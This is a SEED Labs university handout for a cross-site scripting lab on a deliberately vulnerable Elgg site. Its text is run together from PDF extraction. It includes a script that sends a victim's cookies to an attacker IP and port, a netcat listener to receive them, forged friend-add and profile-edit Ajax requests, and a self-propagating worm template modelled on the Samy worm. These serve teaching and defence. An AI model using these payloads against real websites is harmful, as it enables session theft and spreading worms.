SEEDLabsŒCross-SiteScriptingAttackLab 1 Cross-SiteScripting XSS AttackLab WebApplication Elgg Copyright©2006-2016WenliangDu SyracuseUniversity ThedevelopmentofthisdocumentwaspartiallyfundedbytheNationalScienceFoundationunderAward No.1303306and1318814.ThisworkislicensedunderaCreativeCommonsAttribution-NonCommercial- ShareAlike4.0InternationalLicense.Ahuman-readablesummaryof andnotasubstitutefor thelicenseis thefollowing Youarefreetocopyandredistributethematerialinanymediumorformat.Youmustgive appropriatecredit.Ifyouremix transform orbuilduponthematerial youmustdistributeyourcontributions underthesamelicenseastheoriginal.Youmaynotusethematerialforcommercialpurposes 1Overview Cross-sitescripting XSS isatypeofvulnerabilitycommonlyfoundinwebapplications.Thisvulnerability makesitpossibleforattackerstoinjectmaliciouscode e.g.JavaScriptprograms intovictim'swebbrowser Usingthismaliciouscode attackerscanstealavictim'scredentials suchassessioncookies.Theaccess controlpolicies i.e. thesameoriginpolicy employedbybrowserstoprotectthosecredentialscanbe bypassedbyexploitingXSSvulnerabilities.Vulnerabilitiesofthiskindcanpotentiallyleadtolarge-scale attacks TodemonstratewhatattackerscandobyexploitingXSSvulnerabilities wehavesetupawebapplica- tionnamed Elgg inourpre-builtUbuntuVMimage Elgg isaverypopularopen-sourcewebapplication forsocialnetwork andithasimplementedanumberofcountermeasurestoremedytheXSSthreat.To demonstratehowXSSattackswork wehavecommentedoutthesecountermeasuresinElgginourinstalla- tion intentionallymakingElggvulnerabletoXSSattacks.Withoutthecountermeasures userscanpostany arbitrarymessage includingJavaScriptprograms totheuserInthislab studentsneedtoexploit thisvulnerabilitytolaunchanXSSattackonthe Elgg inawaythatissimilartowhatSamy Kamkardidto MySpace in2005throughthenotoriousSamyworm.Theultimategoalofthisattackisto spreadanXSSwormamongtheusers suchthatwhoeverviewsaninfecteduserwillbeinfected andwhoeverisinfectedwilladdyou i.e. theattacker tohis/herfriendlist.Thislabcoversthefollowing topics Ł Cross-SiteScriptingattack Ł XSSwormandself-propagation Ł Sessioncookies Ł HTTPGETandPOSTrequests Ł JavaScriptandAjax Readings DetailedcoverageoftheCross-SiteScriptingattackcanbefoundinChapter10oftheSEED book ComputerSecurity AHands-onApproach byWenliangDu Labenvironment Thislabhasbeentestedonourpre-builtUbuntu16.04VM whichcanbedownloaded fromtheSEEDwebsite SEEDLabsŒCross-SiteScriptingAttackLab 2 2LabEnvironment ThislabcanonlybeconductedinourUbuntu16.04VM becauseofthethatwehaveper- formedtosupportthislab.Wesummarizetheseinthissection The Elgg WebApplication Weuseanopen-sourcewebapplicationcalled Elgg inthislab Elgg isa web-basedsocial-networkingapplication.Itisalreadysetupinthepre-built Ubuntu VMimage.Wehave alsocreatedseveraluseraccountsonthe Elgg serverandthecredentialsaregivenbelow User UserName Password Admin admin seedelgg Alice alice seedalice Boby boby seedboby Charlie charlie seedcharlie Samy samy seedsamy DNS WehavethefollowingURLneededforthislab.Thefolderwherethe webapplicationisinstalledandtheURLtoaccessthiswebapplicationaredescribedinthefollowing URL http //www.xsslabelgg.com Folder /var/www/XSS/Elgg/ TheaboveURLisisonlyaccessiblefrominsideofthevirtualmachine becausewehave /etc/hosts tomapthedomainnameofeachURLtothevirtualmachine'slocalIPaddress 127.0.0.1 .YoumaymapanydomainnametoaparticularIPaddressusing /etc/hosts .For example youcanmap http //www.example.com tothelocalIPaddressbyappendingthefollowing entryto /etc/hosts 127.0.0.1www.example.com Ifyourwebserverandbrowserarerunningontwodifferentmachines youneedtomodify /etc/hosts onthebrowser'smachineaccordinglytomapthesedomainnamestothewebserver'sIPaddress notto 127.0.0.1 Apache Inourpre-builtVMimage weusedApacheservertohostallthewebsitesused inthelab.Thename-basedvirtualhostingfeatureinApachecouldbeusedtohostseveralwebsites URLs onthesamemachine.Anamed 000-default.conf inthedirectory '' /etc/ apache2/sites-available '' containsthenecessarydirectivesforthe Insidetheeachwebsitehasa VirtualHost blockthattheURLforthe websiteanddirectoryinthesystemthatcontainsthesourcesforthewebsite.Thefollowingexamples showhowtoawebsitewithURL http //www.example1.com andanotherwebsitewith URL http //www.example2.com < VirtualHost * > ServerNamehttp //www.example1.com DocumentRoot/var/www/Example_1/ < /VirtualHost > SEEDLabsŒCross-SiteScriptingAttackLab 3 < VirtualHost * > ServerNamehttp //www.example2.com DocumentRoot/var/www/Example_2/ < /VirtualHost > Youmaymodifythewebapplicationbyaccessingthesourceinthementioneddirectories.Forexam- ple withtheabovethewebapplication http //www.example1.com canbechangedby modifyingthesourcesinthe /var/www/Example_1/ directory.Afterachangeismadetothe ration theApacheserverneedstoberestarted.Seethefollowingcommand $ sudoserviceapache2start 3LabTasks 3.1Preparation GettingFamiliarwiththe '' HTTPHeaderLive '' tool Inthislab weneedtoconstructHTTPrequests.TooutwhatanacceptableHTTPrequestinElgg lookslike weneedtobeabletocaptureandanalyzeHTTPrequests.WecanuseaFirefoxadd-oncalled '' HTTPHeaderLive '' forthispurpose.Beforeyoustartworkingonthislab youshouldgetfamiliar withthistool.InstructionsonhowtousethistoolisgivenintheGuidelinesection §4.1 3.2Task1 PostingaMaliciousMessagetoDisplayanAlertWindow TheobjectiveofthistaskistoembedaJavaScriptprograminyour Elgg suchthatwhenanother userviewsyourtheJavaScriptprogramwillbeexecutedandanalertwindowwillbedisplayed.The followingJavaScriptprogramwilldisplayanalertwindow < script > alert 'XSS ' < /script > IfyouembedtheaboveJavaScriptcodeinyour e.g.inthebriefdescriptionthenanyuser whoviewsyourwillseethealertwindow Inthiscase theJavaScriptcodeisshortenoughtobetypedintotheshortdescriptionIfyouwant torunalongJavaScript butyouarelimitedbythenumberofcharactersyoucantypeintheform youcan storetheJavaScriptprograminastandalonesaveitwiththe.jsextension andthenrefertoitusingthe src attributeinthe < script > tag.Seethefollowingexample < scripttype= '' text/javascript '' src= '' http //www.example.com/myscripts.js '' > < /script > Intheaboveexample thepagewillfetchtheJavaScriptprogramfrom http //www.example.com whichcanbeanywebserver 3.3Task2 PostingaMaliciousMessagetoDisplayCookies TheobjectiveofthistaskistoembedaJavaScriptprograminyour Elgg suchthatwhenanother userviewsyourtheuser'scookieswillbedisplayedinthealertwindow.Thiscanbedonebyadding someadditionalcodetotheJavaScriptprogramintheprevioustask < script > alert document.cookie < /script > SEEDLabsŒCross-SiteScriptingAttackLab 4 3.4Task3 StealingCookiesfromtheVictim'sMachine Intheprevioustask themaliciousJavaScriptcodewrittenbytheattackercanprintouttheuser'scookies butonlytheusercanseethecookies nottheattacker.Inthistask theattackerwantstheJavaScriptcodeto sendthecookiestohimself/herself.Toachievethis themaliciousJavaScriptcodeneedstosendanHTTP requesttotheattacker withthecookiesappendedtotherequest WecandothisbyhavingthemaliciousJavaScriptinsertan < img > tagwithits src attributesettothe attacker'smachine.WhentheJavaScriptinsertsthe img tag thebrowsertriestoloadtheimagefromthe URLinthe src thisresultsinanHTTPGETrequestsenttotheattacker'smachine.TheJavaScript givenbelowsendsthecookiestotheport5555oftheattacker'smachine withIPaddress 10.1.2.5 wheretheattackerhasaTCPserverlisteningtothesameport < script > document.write ' < imgsrc=http //10.1.2.5:5555 ? c=' +escape document.cookie + ' > ' < /script > Acommonlyusedprogrambyattackersis netcat nc ifrunningwiththe '' -l '' option becomesaTCPserverthatlistensforaconnectionontheport.Thisserverprogrambasically printsoutwhateverissentbytheclientandsendstotheclientwhateveristypedbytheuserrunningthe server.Typethecommandbelowtolistenonport 5555 $ nc-l5555-v Theﬂ -l ﬂoptionisusedtospecifythatncshouldlistenforanincomingconnectionratherthaninitiatea connectiontoaremotehost.Theﬂ -v ﬂoptionisusedtohave nc givemoreverboseoutput ThetaskcanalsobedonewithonlyoneVMinsteadoftwo.ForoneVM youshouldreplacethe attacker'sIPaddressintheabovescriptwith 127.0.0.1 .Startanewterminalandthentypethe nc commandabove 3.5Task4 BecomingtheVictim'sFriend Inthisandnexttask wewillperformanattacksimilartowhatSamydidtoMySpacein2005 i.e.theSamy Worm .WewillwriteanXSSwormthataddsSamyasafriendtoanyotheruserthatvisitsSamy'spage Thiswormdoesnotself-propagate intask6 wewillmakeitself-propagating Inthistask weneedtowriteamaliciousJavaScriptprogramthatforgesHTTPrequestsdirectlyfrom thevictim'sbrowser withouttheinterventionoftheattacker.TheobjectiveoftheattackistoaddSamyas afriendtothevictim.WehavealreadycreatedausercalledSamyonthe Elgg server theusernameis samy Toaddafriendforthevictim weshouldouthowalegitimateuseraddsafriendin Elgg .More weneedtooutwhataresenttotheserverwhenauseraddsafriend.Firefox's HTTP inspectiontoolcanhelpusgettheinformation.ItcandisplaythecontentsofanyHTTPrequestmessage sentfromthebrowser.Fromthecontents wecanidentifyalltheparametersintherequest.Section4 providesguidelinesonhowtousethetool Onceweunderstandwhattheadd-friendHTTPrequestlooklike wecanwriteaJavascriptprogramto sendoutthesameHTTPrequest.WeprovideaskeletonJavaScriptcodethataidsincompletingthetask < scripttype= '' text/javascript '' > window.onload=function { varAjax=null varts= '' & __elgg_ts= '' +elgg.security.token.__elgg_ts À SEEDLabsŒCross-SiteScriptingAttackLab 5 vartoken= '' & __elgg_token= '' +elgg.security.token.__elgg_token Á //ConstructtheHTTPrequesttoaddSamyasafriend varsendurl= ... //FILLIN //CreateandsendAjaxrequesttoaddfriend Ajax=newXMLHttpRequest Ajax.open `` GET '' sendurl true Ajax.setRequestHeader `` Host '' '' www.xsslabelgg.com '' Ajax.setRequestHeader `` Content-Type '' '' application/x-www-form-urlencoded '' Ajax.send } < /script > Theabovecodeshouldbeplacedinthe '' AboutMe '' ofSamy'spage.Thisldprovides twoeditingmodes Editormode default andTextmode.TheEditormodeaddsextraHTMLcodetothe texttypedintothewhiletheTextmodedoesnot.Sincewedonotwantanyextracodeaddedtoour attackingcode theTextmodeshouldbeenabledbeforeenteringtheaboveJavaScriptcode.Thiscanbe donebyclickingon '' EditHTML '' whichcanbefoundatthetoprightofthe '' AboutMe '' text Questions Pleaseanswerthefollowingquestions Ł Question1 ExplainthepurposeofLines À Á whyaretheyareneeded ? Ł Question2 Ifthe Elgg applicationonlyprovidetheEditormodeforthe '' AboutMe '' i.e. youcannotswitchtotheTextmode canyoustilllaunchasuccessfulattack ? 3.6Task5 ModifyingtheVictim'sPr Theobjectiveofthistaskistomodifythevictim'swhenthevictimvisitsSamy'spage.Wewill writeanXSSwormtocompletethetask.Thiswormdoesnotself-propagate intask6 wewillmakeit self-propagating Similartotheprevioustask weneedtowriteamaliciousJavaScriptprogramthatforgesHTTPrequests directlyfromthevictim'sbrowser withouttheinterventionoftheattacker.Tomodifyweshould outhowalegitimateusereditsorhis/herin Elgg .More weneed toouthowtheHTTPPOSTrequestisconstructedtomodifyauser'sWewilluseFirefox's HTTP inspectiontool.OnceweunderstandhowtheHTTPPOSTrequestlookslike wecan writeaJavaScriptprogramtosendoutthesameHTTPrequest.WeprovideaskeletonJavaScriptcodethat aidsincompletingthetask < scripttype= '' text/javascript '' > window.onload=function { //JavaScriptcodetoaccessusername userguid TimeStamp__elgg_ts //andSecurityToken__elgg_token varuserName=elgg.session.user.name varguid= '' & guid= '' +elgg.session.user.guid varts= '' & __elgg_ts= '' +elgg.security.token.__elgg_ts vartoken= '' & __elgg_token= '' +elgg.security.token.__elgg_token //Constructthecontentofyoururl varcontent= ... //FILLIN SEEDLabsŒCross-SiteScriptingAttackLab 6 varsamyGuid= ... //FILLIN elgg.session.user.guid ! =samyGuid À { //CreateandsendAjaxrequesttomodifyprofile varAjax=null Ajax=newXMLHttpRequest Ajax.open `` POST '' sendurl true Ajax.setRequestHeader `` Host '' '' www.xsslabelgg.com '' Ajax.setRequestHeader `` Content-Type '' '' application/x-www-form-urlencoded '' Ajax.send content } } < /script > SimilartoTask4 theabovecodeshouldbeplacedinthe '' AboutMe '' ofSamy'spage andtheTextmodeshouldenabledbeforeenteringtheaboveJavaScriptcode Questions Pleaseanswerthefollowingquestions Ł Question3 WhydoweneedLine À ? Removethisline andrepeatyourattack.Reportandexplain yourobservation 3.7Task6 WritingaSelf-PropagatingXSSWorm Tobecomearealworm themaliciousJavaScriptprogramshouldbeabletopropagateitself.Namely wheneversomepeopleviewaninfectednotonlywilltheirbethewormwillalso bepropagatedtotheirfurtheraffectingotherswhoviewthesenewlyinfectedThisway themorepeopleviewtheinfectedthefasterthewormcanpropagate.Thisisexactlythesame mechanismusedbytheSamyWorm withinjust20hoursofitsOctober4,2005release overonemillion userswereaffected makingSamyoneofthefastestspreadingvirusesofalltime.TheJavaScriptcodethat canachievethisiscalleda self-propagatingcross-sitescriptingworm .Inthistask youneedtoimplement suchaworm whichnotonlythevictim'sandaddstheuserﬁSamyﬂasafriend butalso addacopyofthewormitselftothevictim'ssothevictimisturnedintoanattacker Toachieveself-propagation whenthemaliciousJavaScriptthevictim'sitshouldcopy itselftothevictim'sThereareseveralapproachestoachievethis andwewilldiscusstwocommon approaches LinkApproach Ifthewormisincludedusingthe src attributeinthe < script > tag writingself- propagatingwormsismucheasier.Wehavediscussedthe src attributeinTask1 andanexampleisgiven below.Thewormcansimplycopythefollowing < script > tagtothevictim'sessentiallyinfecting thewiththesameworm < scripttype= '' text/javascript '' src= '' http //example.com/xss_worm.js '' > < /script > DOMApproach IftheentireJavaScriptprogram i.e. theworm isembeddedintheinfectedto propagatethewormtoanotherthewormcodecanuseDOMAPIstoretrieveacopyofitselffrom SEEDLabsŒCross-SiteScriptingAttackLab 7 thewebpage.AnexampleofusingDOMAPIsisgivenbelow.Thiscodegetsacopyofitself anddisplays itinanalertwindow < scriptid=worm > varheaderTag= '' < scriptid=\ '' worm\ '' type=\ '' text/javascript\ '' > '' À varjsCode=document.getElementById `` worm '' .innerHTML Á vartailTag= '' < '' + '' script > '' Â varwormCode=encodeURIComponent headerTag+jsCode+tailTag Ã alert jsCode < /script > Itshouldbenotedthat innerHTML line Á onlygivesustheinsidepartofthecode notincludingthe surrounding script tags.Wejustneedtoaddthebeginningtag < scriptid= '' worm '' > line À theendingtag < /script > line Â toformanidenticalcopyofthemaliciouscode WhendataaresentinHTTPPOSTrequestswiththe Content-Type setto application/x-www- form-urlencoded whichisthetypeusedinourcode thedatashouldalsobeencoded.Theencoding schemeiscalled URLencoding whichreplacesnon-alphanumericcharactersinthedatawith % HH aper- centagesignandtwohexadecimaldigitsrepresentingtheASCIIcodeofthecharacter.The encodeURICom ponent functioninline Ã isusedtoURL-encodeastring Note Inthislab youcantrybothLinkandDOMapproaches buttheDOMapproachisrequired itismorechallenginganditdoesnotrelyonexternalJavaScriptcode 3.8Task7 Countermeasures Elgg doeshaveabuiltincountermeasurestodefendagainsttheXSSattack.Wehavedeactivatedand commentedoutthecountermeasurestomaketheattackwork.Thereisacustombuiltsecurityplugin HTMLawed ontheElggwebapplicationwhichonactivation validatestheuserinputandremovesthe tagsfromtheinput.Thispluginisregisteredtothe functionfilter tags inthe elgg/ engine/lib/input.php Toturnonthecountermeasure logintotheapplicationasadmin goto Account- > administration toprightofscreen ! plugins ontherightpanel andclickon securityandspam underthe optionsatthetopofthepage.Youshouldthe HTMLawed pluginbelow.Clickon Activate toenable thecountermeasure Inadditiontothe HTMLawed1.9 securitypluginin Elgg thereisanotherbuilt-inPHPmethodcalled htmlspecialchars whichisusedtoencodethespecialcharactersinuserinput suchas '' < `` & lt '' > '' & gt etc.Pleasegoto /var/www/XSS/Elgg/vendor/elgg/elgg/views/default/ output/ andthefunctioncall htmlspecialchars text.php url.php dropdown.php email.php Uncommentthecorresponding '' htmlspecialchars '' functioncallsineach Onceyouknowhowtoturnonthesecountermeasures pleasedothefollowing Pleasedonotchange anyothercodeandmakesurethattherearenosyntaxerrors 1 Activateonlythe HTMLawed countermeasurebutnot htmlspecialchars visitanyofthevictim anddescribeyourobservationsinyourreport 2 Turnonbothcountermeasures visitanyofthevictimanddescribeyourobservationinyour report SEEDLabsŒCross-SiteScriptingAttackLab 8 4Guidelines 4.1Usingthe '' HTTPHeaderLive '' add-ontoInspectHTTPHeaders TheversionofFirefox version60 inourUbuntu16.04VMdoesnotsupportthe LiveHTTPHeader add-on whichwasusedinourUbuntu12.04VM.Anewadd-oncalled '' HTTPHeaderLive '' isused initsplace.Theinstructiononhowtoenableandusethisadd-ontoolisdepictedinFigure1.Justclickthe iconmarkedby À asidebarwillshowupontheleft.Makesurethat HTTPHeaderLive isselected atposition Á .Thenclickanylinkinsideawebpage allthetriggeredHTTPrequestswillbecapturedand displayedinsidethesidebarareamarkedby Â .IfyouclickonanyHTTPrequest apop-upwindowwill showuptodisplaytheselectedHTTPrequest.Unfortunately thereisabuginthisadd-ontool itisstill underdevelopment nothingwillshowupinsidethepop-upwindowunlessyouchangeitssize Itseems thatre-drawingisnotautomaticallytriggeredwhenthewindowpopsup butchangingitssizewilltrigger there-drawing Figure1 EnabletheHTTPHeaderLiveAdd-on 4.2UsingtheWebDeveloperTooltoInspectHTTPHeaders ThereisanothertoolprovidedbyFirefoxthatcanbequiteusefulininspectingHTTPheaders.Thetoolis theWebDeveloperNetworkTool.Inthissection wecoversomeoftheimportantfeaturesofthetool.The WebDeveloperNetworkToolcanbeenabledviathefollowingnavigation ClickFirefox'stoprightmenu -- > WebDeveloper -- > Network Clickthe '' Tools '' menu -- > WebDeveloper -- > Network WeusetheuserloginpageinElggasanexample.Figure2showstheNetworkToolshowingtheHTTP POSTrequestthatwasusedforlogin Tofurtherseethedetailsoftherequest wecanclickonaparticularHTTPrequestandthetoolwill showtheinformationintwopanes seeFigure3 Thedetailsoftheselectedrequestwillbevisibleintherightpane.Figure4 showsthedetailsofthe loginrequestinthe Headers tab detailsincludeURL requestmethod andcookie .Onecanobserve bothrequestandresponseheadersintherightpane.TochecktheparametersinvolvedinanHTTPrequest wecanusethe Params tab.Figure4 b showstheparametersentintheloginrequesttoElgg including SEEDLabsŒCross-SiteScriptingAttackLab 9 Figure2 HTTPRequestinWebDeveloperNetworkTool Figure3 HTTPRequestandRequestDetailsinTwoPanes username password .ThetoolcanbeusedtoinspectHTTPGETrequestsinasimilarmannerto HTTPPOSTrequests FontSize ThedefaultfontsizeofWebDeveloperToolswindowisquitesmall.Itcanbeincreasedby focusingclickanywhereintheNetworkToolwindow andthenusing Ctrl + button 4.3JavaScriptDebugging WemayalsoneedtodebugourJavaScriptcode.Firefox'sDeveloperToolcanalsohelpdebugJavaScript code.Itcanpointustothepreciseplaceswhereerrorsoccur.Thefollowinginstructionshowshowtoenable thisdebuggingtool Clickthe '' Tools '' menu -- > WebDeveloper -- > WebConsole orusetheShift+Ctrl+Kshortcut Onceweareinthewebconsole clickthe JS tab.Clickthedownwardpointingarrowheadbeside JS andensurethereisacheckmarkbeside Error .IfyouarealsointerestedinWarningmessages click Warning .SeeFigure5 Ifthereareanyerrorsinthecode amessagewilldisplayintheconsole.Thelinethatcausedtheerror appearsontherightsideoftheerrormessageintheconsole.Clickonthelinenumberandyouwillbetaken totheexactplacethathastheerror.SeeFigure6 5Submission Youneedtosubmitadetailedlabreporttodescribewhatyouhavedoneandwhatyouhaveobserved PleaseprovidedetailsusingFirefox'sadd-ontools Wireshark and/orscreenshots.Youalsoneedto SEEDLabsŒCross-SiteScriptingAttackLab 10 HTTPRequestHeaders b HTTPRequestParameters Figure4 HTTPHeadersandParameters Figure5 DebuggingJavaScriptCode 1 provideexplanationtotheobservationsthatareinterestingorsurprising Figure6 DebuggingJavaScriptCode 2 